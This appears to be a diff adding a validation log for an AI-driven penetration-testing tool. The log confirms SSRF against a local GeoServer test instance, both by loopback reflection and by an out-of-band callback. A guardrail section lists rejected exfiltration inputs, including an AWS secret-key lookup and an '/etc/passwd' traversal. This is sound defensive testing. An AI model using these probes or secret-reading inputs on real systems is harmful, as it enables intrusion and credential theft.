@@ -1,0 +1,75 @@
+12:49:09 clinkz.oob.collaborator    INFO  OOB collaborator started: zone=host.docker.internal:18080 shape=path http=0.0.0.0:18080 dns=0.0.0.0:15353
+12:49:09 clinkz.oob.collaborator    INFO  OOB collaborator health-check: http=True dns=True recorded=['dns', 'http'] → healthy=True
+12:49:09 clinkz.llm.factory         INFO  Initializing LLM client: provider=anthropic agent_role=-
+12:49:10 clinkz.state               INFO  State store connected (WAL mode): C:\Users\ptkva\OneDrive\Documents\clinkz\outputs\oob_ssrf_validation.db
+12:49:10 clinkz.state               INFO  Created engagement: P6 OOB isolation — GeoServer SSRF (0b993c1e-dec5-4cdd-9da3-2ad65f4979ed)
+12:49:10 clinkz.llm.fallback.ResilientLLMClient INFO  ResilientLLMClient initialised — role=exploit profile=reasoning chain=['anthropic']
+12:49:10 clinkz.llm.factory         INFO  Initializing LLM client: provider=anthropic agent_role=-
+12:50:01 clinkz.agents.base.ReportAgent INFO  ReportAgent starting (simple mode) for 'P6 OOB isolation' (0b993c1e-dec5-4cdd-9da3-2ad65f4979ed)
+12:50:01 clinkz.agents.base.ReportAgent INFO  Loaded 2 findings, 0 targets
+12:50:01 clinkz.agents.base.ReportAgent INFO  JSON report written to outputs\0b993c1e-dec5-4cdd-9da3-2ad65f4979ed\report_0b993c1e-dec5-4cdd-9da3-2ad65f4979ed.json
+12:50:01 clinkz.agents.base.ReportAgent INFO  Markdown report written to outputs\0b993c1e-dec5-4cdd-9da3-2ad65f4979ed\report_0b993c1e-dec5-4cdd-9da3-2ad65f4979ed.md
+12:50:01 clinkz.agents.base.ReportAgent INFO  Report complete: 2 findings, risk_rating=High
+12:50:01 clinkz.oob.collaborator    INFO  OOB collaborator stopped and event log cleared
+
+==============================================================================
+PRE-FLIGHT (keys + GeoServer + collaborator health-check)
+==============================================================================
+GeoServer /web/ -> HTTP 200; GET http://localhost:8080/geoserver/TestWfsPost -> HTTP 200
+ANTHROPIC_API_KEY present: True; TOOL_EXEC_MODE=local
+OOB collaborator healthy: zone=host.docker.internal:18080 shape=path http_port=18080 dns_port=15353
+
+==============================================================================
+D. EXFIL GUARDRAIL — the carrier refuses to build an exfil payload
+==============================================================================
+  refused exfil attempt '${env:AWS_SECRET_ACCESS_KEY}' (ValueError) ✓
+  refused exfil attempt '../../etc/passwd' (ValueError) ✓
+  refused exfil attempt 'victim.internal' (ValueError) ✓
+  refused exfil attempt 'a b' (ValueError) ✓
+  carrier output for a real nonce: http://host.docker.internal:18080/obmswj3jgfviq7gqlrskrs3aym  (host is fixed collaborator authority)
+
+==============================================================================
+A. IN-BAND SSRF unregressed (P3, the built primitive)
+==============================================================================
+  [HIGH] Server-Side Request Forgery (SSRF) — reflected_internal
+      • Request: SSRF reflected_internal http://localhost:8080/geoserver/TestWfsPost — url=http://127.0.0.1:8080/geoserver/
+      • Response: loopback fetch reflected in-scope internal content ('GeoServer: Redirecting') via http://127.0.0.1:8080/geoserver/ (status 200)
+      • phases_completed=6 verified=True strength=verified
+      • exploitation_type=reflected_internal
+      • capability=fetch_confirmed=True,content_reflected=True,schemes=['http']
+  in-band SSRF findings: 1 (confirmed=True)
+
+==============================================================================
+B. P6 CONFIRM — point SSRF url at the collaborator, reap the callback
+==============================================================================
+  confirmed_out_of_band=True  note=out-of-band callback bearing the probe nonce received (http from 127.0.0.1)
+  RAW-AUDITABLE P6 evidence pair:
+    primitive         : P6
+    outbound_probe    : POST http://localhost:8080/geoserver/TestWfsPost — url=http://host.docker.internal:18080/vkp2qthmfi65kpkl6mbwwe56wa
+    callback_nonce    : vkp2qthmfi65kpkl6mbwwe56wa
+    inbound_callback  : inbound callback: proto=http src=127.0.0.1 host=host.docker.internal:18080 path=/vkp2qthmfi65kpkl6mbwwe56wa received_at=1784445581.618
+    control           : fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)
+    control_bore_nonce: False (must be False)
+
+==============================================================================
+C. ZERO-FP — same probe, fetch-guard egress denied (no carrier) → no callback
+==============================================================================
+  control confirmed_out_of_band=False (expect False)  note=blind_unconfirmed (egress may be filtered) — no callback within the window
+
+==============================================================================
+REPORT + TRACE (raw artifact paths)
+==============================================================================
+engagement_id : 0b993c1e-dec5-4cdd-9da3-2ad65f4979ed
+report (json) : outputs\0b993c1e-dec5-4cdd-9da3-2ad65f4979ed\report_0b993c1e-dec5-4cdd-9da3-2ad65f4979ed.json
+report (md)   : outputs\0b993c1e-dec5-4cdd-9da3-2ad65f4979ed\report_0b993c1e-dec5-4cdd-9da3-2ad65f4979ed.md
+trace (jsonl) : C:\Users\ptkva\OneDrive\Documents\clinkz\outputs\0b993c1e-dec5-4cdd-9da3-2ad65f4979ed\trace.jsonl
+
+==============================================================================
+VERDICT
+==============================================================================
+  A. in-band SSRF unregressed (P3)             : True
+  B. P6 confirm via callback (raw-auditable)   : True
+  C. zero-FP (egress denied → no callback)     : True
+  D. exfil guardrail holds (structural)        : True
+
+  RESULT: PASS
